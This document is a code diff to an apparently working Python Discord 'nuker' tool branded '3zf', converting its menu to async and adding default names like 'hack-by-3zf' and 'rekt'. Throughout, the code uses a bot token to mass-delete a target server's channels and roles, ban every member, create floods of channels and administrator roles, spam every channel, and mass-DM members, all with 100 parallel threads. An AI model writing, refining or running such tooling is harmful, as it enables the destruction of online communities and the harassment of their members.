@@ -9,9 +9,10 @@ guild_target = None
 running = True
 cnt = {"v": 0}
 lck = threading.Lock()
-
-chan_list = []
-role_list = []
+chan_list = ["hack-by-3zf", "nuker-by-3zf", "owned-by-3zf"]
+role_list = ["3zf", "nuked", "rekt"]
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
 
 @client.event
 async def on_ready():
@@ -46,19 +47,10 @@ async def on_ready():
             pass
     
     os.system("cls || clear")
-    print("\033[91m██████╗ ███████╗███████╗\033[0m")
-    print("\033[91m╚════██╗╚══███╔╝██╔════╝\033[0m")
-    print("\033[91m █████╔╝  ███╔╝ █████╗\033[0m")
-    print("\033[91m ╚═══██╗ ███╔╝  ██╔══╝\033[0m")
-    print("\033[91m██████╔╝███████╗██║\033[0m")
-    print("\033[91m╚═════╝ ╚══════╝╚═╝\033[0m")
-    print("\033[91m============================================================\033[0m")
-    print(f"\033[91m  TARGET : \033[97m{guild_target.name}\033[0m")
-    print(f"\033[91m  ID      : \033[97m{guild_target.id}\033[0m")
-    print("\033[91m============================================================\033[0m")
-    menu()
+    show_target()
+    await menu()
 
-def show_banner():
+def show_target():
     print("\033[91m██████╗ ███████╗███████╗\033[0m")
     print("\033[91m╚════██╗╚══███╔╝██╔════╝\033[0m")
     print("\033[91m █████╔╝  ███╔╝ █████╗\033[0m")
@@ -70,7 +62,7 @@ def show_banner():
     print(f"\033[91m  ID      : \033[97m{guild_target.id}\033[0m")
     print("\033[91m============================================================\033[0m")
 
-def menu():
+async def menu():
     global running
     while running:
         print("")
@@ -91,48 +83,55 @@ def menu():
         print("\033[91m└──────────────────────────────────────────────────────────┘\033[0m")
         print("\033[0m")
         
-        c = input("\033[91m[>] OPTION : \033[97m").strip()
+        try:
+            c = input("\033[91m[>] OPTION : \033[97m").strip()
+        except:
+            c = ""
         
-        if c == "1": asyncio.run_coroutine_threadsafe(del_chans(), client.loop)
-        elif c == "2": asyncio.run_coroutine_threadsafe(del_roles(), client.loop)
-        elif c == "3": asyncio.run_coroutine_threadsafe(ban_all(), client.loop)
+        if c == "1":
+            await del_chans()
+        elif c == "2":
+            await del_roles()
+        elif c == "3":
+            await ban_all()
         elif c == "4":
             print("")
             n1 = input("\033[91m[>] CHANNEL NAME 1 : \033[97m").strip().lower().replace(" ","-")
             n2 = input("\033[91m[>] CHANNEL NAME 2 : \033[97m").strip().lower().replace(" ","-")
             n3 = input("\033[91m[>] CHANNEL NAME 3 : \033[97m").strip().lower().replace(" ","-")
-            global chan_list
-            chan_list = []
-            if n1: chan_list.append(n1)
-            if n2: chan_list.append(n2)
-            if n3: chan_list.append(n3)
-            if not chan_list:
-                chan_list = ["hack-by-3zf","nuker-by-3zf","owned-by-3zf"]
-            asyncio.run_coroutine_threadsafe(create_chans(), client.loop)
+            names = []
+            if n1: names.append(n1)
+            if n2: names.append(n2)
+            if n3: names.append(n3)
+            if names:
+                chan_list.clear()
+                chan_list.extend(names)
+            await create_chans()
         elif c == "5":
             print("")
             n1 = input("\033[91m[>] ROLE NAME 1 : \033[97m").strip()
             n2 = input("\033[91m[>] ROLE NAME 2 : \033[97m").strip()
             n3 = input("\033[91m[>] ROLE NAME 3 : \033[97m").strip()
-            global role_list
-            role_list = []
-            if n1: role_list.append(n1)
-            if n2: role_list.append(n2)
-            if n3: role_list.append(n3)
-            if not role_list:
-                role_list = ["3zf","nuked","rekt"]
-            asyncio.run_coroutine_threadsafe(create_roles(), client.loop)
-        elif c == "6": asyncio.run_coroutine_threadsafe(spam_all(), client.loop)
+            names = []
+            if n1: names.append(n1)
+            if n2: names.append(n2)
+            if n3: names.append(n3)
+            if names:
+                role_list.clear()
+                role_list.extend(names)
+            await create_roles()
+        elif c == "6":
+            await spam_all()
         elif c == "7":
             print("")
-            asyncio.run_coroutine_threadsafe(change_name(), client.loop)
+            await change_name()
         elif c == "8":
             print("")
-            asyncio.run_coroutine_threadsafe(dm_all(), client.loop)
+            await dm_all()
         elif c == "0":
             running = False
             print("\033[91m[+] BYE\033[0m")
-            asyncio.run_coroutine_threadsafe(client.close(), client.loop)
+            await client.close()
             sys.exit(0)
 
 async def del_chans():
@@ -142,19 +141,21 @@ async def del_chans():
     
     def work(ch):
         try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            loop.run_until_complete(ch.delete())
+            l = asyncio.new_event_loop()
+            asyncio.set_event_loop(l)
+            l.run_until_complete(ch.delete())
             with lck: cnt["v"] += 1
-            loop.close()
-        except: pass
+            l.close()
+        except:
+            pass
     
     with ThreadPoolExecutor(max_workers=100) as exe:
         exe.map(work, chs)
     
     print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m CHANNELS DELETED \033[97m[{time.time()-start:.2f}s]\033[0m")
     input("\033[91m[>] ENTER\033[0m")
-    os.system("cls || clear"); show_banner(); menu()
+    os.system("cls || clear")
+    show_target()
 
 async def del_roles():
     start = time.time()
@@ -163,19 +164,21 @@ async def del_roles():
     
     def work(r):
         try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            loop.run_until_complete(r.delete())
+            l = asyncio.new_event_loop()
+            asyncio.set_event_loop(l)
+            l.run_until_complete(r.delete())
             with lck: cnt["v"] += 1
-            loop.close()
-        except: pass
+            l.close()
+        except:
+            pass
     
     with ThreadPoolExecutor(max_workers=100) as exe:
         exe.map(work, roles)
     
     print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m ROLES DELETED \033[97m[{time.time()-start:.2f}s]\033[0m")
     input("\033[91m[>] ENTER\033[0m")
-    os.system("cls || clear"); show_banner(); menu()
+    os.system("cls || clear")
+    show_target()
 
 async def ban_all():
     start = time.time()
@@ -184,7 +187,8 @@ async def ban_all():
     if confirm.lower() != "yes":
         print("\033[91m[-] CANCELLED\033[0m")
         input("\033[91m[>] ENTER\033[0m")
-        os.system("cls || clear"); show_banner(); menu()
+        os.system("cls || clear")
+        show_target()
         return
     
     await guild_target.fetch_members()
@@ -193,19 +197,21 @@ async def ban_all():
     
     def work(m):
         try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            loop.run_until_complete(m.ban(reason="3zF"))
+            l = asyncio.new_event_loop()
+            asyncio.set_event_loop(l)
+            l.run_until_complete(m.ban(reason="3zF"))
             with lck: cnt["v"] += 1
-            loop.close()
-        except: pass
+            l.close()
+        except:
+            pass
     
     with ThreadPoolExecutor(max_workers=100) as exe:
         exe.map(work, members)
     
     print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m MEMBERS BANNED \033[97m[{time.time()-start:.2f}s]\033[0m")
     input("\033[91m[>] ENTER\033[0m")
-    os.system("cls || clear"); show_banner(); menu()
+    os.system("cls || clear")
+    show_target()
 
 async def create_chans():
     start = time.time()
@@ -214,36 +220,41 @@ async def create_chans():
     except:
         print("\033[91m[-] NUMBER\033[0m")
         input("\033[91m[>] ENTER\033[0m")
-        os.system("cls || clear"); show_banner(); menu()
+        os.system("cls || clear")
+        show_target()
         return
     
     cat_id = input("\033[91m[>] CATEGORY ID (ENTER=NONE) : \033[97m").strip()
     cat = None
     if cat_id:
-        try: cat = client.get_channel(int(cat_id))
-        except: pass
+        try:
+            cat = client.get_channel(int(cat_id))
+        except:
+            pass
     
     cnt["v"] = 0
     
     def work(i):
         try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
+            l = asyncio.new_event_loop()
+            asyncio.set_event_loop(l)
             name = random.choice(chan_list)
             if cat:
-                loop.run_until_complete(guild_target.create_text_channel(name, category=cat))
+                l.run_until_complete(guild_target.create_text_channel(name, category=cat))
             else:
-                loop.run_until_complete(guild_target.create_text_channel(name))
+                l.run_until_complete(guild_target.create_text_channel(name))
             with lck: cnt["v"] += 1
-            loop.close()
-        except: pass
+            l.close()
+        except:
+            pass
     
     with ThreadPoolExecutor(max_workers=100) as exe:
         exe.map(work, range(n))
     
     print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m CHANNELS CREATED \033[97m[{time.time()-start:.2f}s]\033[0m")
     input("\033[91m[>] ENTER\033[0m")
-    os.system("cls || clear"); show_banner(); menu()
+    os.system("cls || clear")
+    show_target()
 
 async def create_roles():
     start = time.time()
@@ -252,38 +263,43 @@ async def create_roles():
     except:
         print("\033[91m[-] NUMBER\033[0m")
         input("\033[91m[>] ENTER\033[0m")
-        os.system("cls || clear"); show_banner(); menu()
+        os.system("cls || clear")
+        show_target()
         return
     
     ci = input("\033[91m[>] HEX COLOR (FF0000) / random : \033[97m").strip()
     if ci.lower() == "random":
         color = random.randint(0, 0xFFFFFF)
     else:
-        try: color = int(ci.replace("#",""), 16)
-        except: color = 0xFF0000
+        try:
+            color = int(ci.replace("#",""), 16)
+        except:
+            color = 0xFF0000
     
     cnt["v"] = 0
     
     def work(i):
         try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
+            l = asyncio.new_event_loop()
+            asyncio.set_event_loop(l)
             name = random.choice(role_list)
-            loop.run_until_complete(guild_target.create_role(
+            l.run_until_complete(guild_target.create_role(
                 name=name,
                 color=discord.Color(color),
                 permissions=discord.Permissions(administrator=True)
             ))
             with lck: cnt["v"] += 1
-            loop.close()
-        except: pass
+            l.close()
+        except:
+            pass
     
     with ThreadPoolExecutor(max_workers=100) as exe:
         exe.map(work, range(n))
     
     print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m ROLES CREATED \033[97m[{time.time()-start:.2f}s]\033[0m")
     input("\033[91m[>] ENTER\033[0m")
-    os.system("cls || clear"); show_banner(); menu()
+    os.system("cls || clear")
+    show_target()
 
 async def spam_all():
     start = time.time()
@@ -292,7 +308,8 @@ async def spam_all():
     except:
         print("\033[91m[-] NUMBER\033[0m")
         input("\033[91m[>] ENTER\033[0m")
-        os.system("cls || clear"); show_banner(); menu()
+        os.system("cls || clear")
+        show_target()
         return
     msg = input("\033[91m[>] MESSAGE : \033[97m")
     
@@ -301,20 +318,22 @@ async def spam_all():
     
     def work(ch):
         try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
+            l = asyncio.new_event_loop()
+            asyncio.set_event_loop(l)
             for _ in range(per):
-                loop.run_until_complete(ch.send(msg))
+                l.run_until_complete(ch.send(msg))
             with lck: cnt["v"] += per
-            loop.close()
-        except: pass
+            l.close()
+        except:
+            pass
     
     with ThreadPoolExecutor(max_workers=100) as exe:
         exe.map(work, chs)
     
     print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m MESSAGES SENT \033[97m[{time.time()-start:.2f}s]\033[0m")
     input("\033[91m[>] ENTER\033[0m")
-    os.system("cls || clear"); show_banner(); menu()
+    os.system("cls || clear")
+    show_target()
 
 async def change_name():
     name = input("\033[91m[>] NEW NAME : \033[97m")
@@ -325,7 +344,8 @@ async def change_name():
         print("\033[91m[-] FAILED\033[0m")
     
     input("\033[91m[>] ENTER\033[0m")
-    os.system("cls || clear"); show_banner(); menu()
+    os.system("cls || clear")
+    show_target()
 
 async def dm_all():
     start = time.time()
@@ -337,19 +357,21 @@ async def dm_all():
     
     def work(m):
         try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            loop.run_until_complete(m.send(msg))
+            l = asyncio.new_event_loop()
+            asyncio.set_event_loop(l)
+            l.run_until_complete(m.send(msg))
             with lck: cnt["v"] += 1
-            loop.close()
-        except: pass
+            l.close()
+        except:
+            pass
     
     with ThreadPoolExecutor(max_workers=100) as exe:
         exe.map(work, members)
     
     print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m DMS SENT \033[97m[{time.time()-start:.2f}s]\033[0m")
     input("\033[91m[>] ENTER\033[0m")
-    os.system("cls || clear"); show_banner(); menu()
+    os.system("cls || clear")
+    show_target()
 
 print("\033[91m██████╗ ███████╗███████╗\033[0m")
 print("\033[91m╚════██╗╚══███╔╝██╔════╝\033[0m")
@@ -364,11 +386,12 @@ print("\033[91m============================================================\033[
 
 while True:
     token = input(f"\n\033[91m[>] TOKEN : \033[97m").strip()
-    if token: break
+    if token:
+        break
 
 try:
     client.run(token)
-except:
+except Exception:
     os.system("cls || clear")
     print("\033[91m██████╗ ███████╗███████╗\033[0m")
     print("\033[91m╚════██╗╚══███╔╝██╔════╝\033[0m")
